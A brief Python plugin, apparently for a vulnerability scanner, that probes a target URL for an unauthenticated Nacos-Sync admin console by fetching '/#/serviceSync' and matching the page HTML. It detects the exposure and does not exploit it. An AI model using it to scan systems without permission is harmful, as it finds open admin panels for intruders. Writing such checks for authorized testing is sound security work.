#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/SJf-ftbfni644diw_J94DA',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'Nacos-Sync 未授权进后台',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/#/serviceSync'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    obj = re.compile(r'<meta name="viewport" content="width=device-width,initial-scale=1">.*?<meta http-equiv="X-UA-Compatible" content="ie=edge">.*?<title>Nacos-Sync</title>.*?<div id="root"></div>',re.S)
    if res.status_code == 200 and obj.search(res.text):
      # ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret